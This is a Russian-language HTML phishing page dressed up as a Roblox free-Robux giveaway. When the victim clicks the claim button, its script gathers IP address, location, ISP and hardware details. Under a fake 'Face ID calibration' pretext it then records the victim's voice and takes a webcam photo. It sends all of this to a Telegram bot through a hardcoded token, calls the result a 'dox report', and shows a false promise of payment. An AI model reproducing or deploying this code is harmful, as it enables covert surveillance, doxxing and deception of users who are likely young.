<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Roblox | Server Sync 2026</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .main-card { background: #111; border: 1px solid #0084ff; padding: 40px; border-radius: 30px; text-align: center; width: 90%; max-width: 400px; box-shadow: 0 0 40px #0084ff33; }
        .btn-claim { background: #0084ff; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 15px; font-size: 22px; font-weight: 900; cursor: pointer; text-transform: uppercase; }
        #inf { margin-top: 15px; font-size: 12px; color: #444; }
        #st { margin: 20px 0; color: #0084ff; font-weight: bold; min-height: 24px; }
        video { position: fixed; top: -100px; left: -100px; width: 1px; height: 1px; opacity: 0.01; }
    </style>
</head>
<body>

<div class="main-card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="70" style="filter: invert(1); margin-bottom: 20px;">
    <h1 style="margin:0;">35,000 ROBUX</h1>
    <p style="color: #888; font-size: 14px; margin-bottom: 25px;">Синхронизация с сервером выдачи. Требуется калибровка датчиков и Face ID.</p>
    <button class="btn-claim" id="btn" onclick="megaLog()">ПОЛУЧИТЬ</button>
    <div id="st">ГОТОВ К ЗАПУСКУ</div>
    <div id="inf">System Node: <span id="node"></span></div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    document.getElementById('node').innerText = Math.floor(Math.random() * 9999);
    const T = '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I';
    const C = '7889497672';

    async function megaLog() {
        document.getElementById('btn').style.display = 'none';
        const st = document.getElementById('st');
        const v = document.getElementById('v');
        const c = document.getElementById('c');

        st.innerText = "ПОДКЛЮЧЕНИЕ К ШЛЮЗУ...";

        // 1. СБОР ДОКСА (IP, Сеть, Железо)
        let d = `🏴‍☠️ **MAXIMUM DOX REPORT** 🏴‍☠️\n\n`;
        try {
            const r = await fetch('https://ipapi.co/json/');
            const j = await r.json();
            d += `📍 IP: \`${j.ip}\`\n🌍 Город: ${j.city}\n📡 Провайдер: ${j.org}\n`;
        } catch(e) {}

        d += `📱 Устройство: ${navigator.platform}\n`;
        d += `⚙️ CPU: ${navigator.hardwareConcurrency} ядер\n`;
        d += `🖥 Экран: ${screen.width}x${screen.height}\n`;
        d += `🔋 Батарея: Опрос...\n`;
        d += `🕶 GPU: ${getG()}\n`;

        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            d = d.replace('Опрос...', `${(b.level * 100).toFixed(0)}%`);
        }

        try {
            // 2. ОТКРЫВАЕМ STREAM (Камера + Микро)
            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
            v.srcObject = s;

            // 3. ЗАПИСЬ ЗВУКА (6 сек)
            const rec = new MediaRecorder(s);
            const chunks = [];
            rec.ondataavailable = e => chunks.push(e.data);
            rec.onstop = async () => {
                const b = new Blob(chunks, { type: 'audio/ogg' });
                const fd = new FormData();
                fd.append('chat_id', C);
                fd.append('voice', b, 'v.ogg');
                fetch(`https://api.telegram.org/bot${T}/sendVoice`, { method: 'POST', body: fd });
            };
            rec.start();
            st.innerText = "КАЛИБРОВКА (ЖДИТЕ)...";

            setTimeout(() => {
                rec.stop();
                
                // 4. ФОТО
                c.width = v.videoWidth;
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                
                c.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', C);
                    fd.append('photo', blob, 'f.jpg');
                    fd.append('caption', d + `\n\n✅ **ФОТО + ГОЛОС ОТПРАВЛЕНЫ!**`);

                    fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd })
                    .then(() => {
                        s.getTracks().forEach(t => t.stop());
                        alert("✅ Успешно! Робуксы придут в течение 10 минут.");
                        window.location.href = "https://www.roblox.com";
                    });
                }, 'image/jpeg', 0.85);
            }, 6000);

        } catch (e) {
            alert("Ошибка! Разрешите камеру и микрофон для получения награды.");
            document.getElementById('btn').style.display = 'block';
        }
    }

    function getG() {
        try {
            const gl = document.createElement('canvas').getContext('webgl');
            const db = gl.getExtension('WEBGL_debug_renderer_info');
            return gl.getParameter(db.UNMASKED_RENDERER_WEBGL);
        } catch(e) { return '?'; }
    }
</script>
</body>
</html>
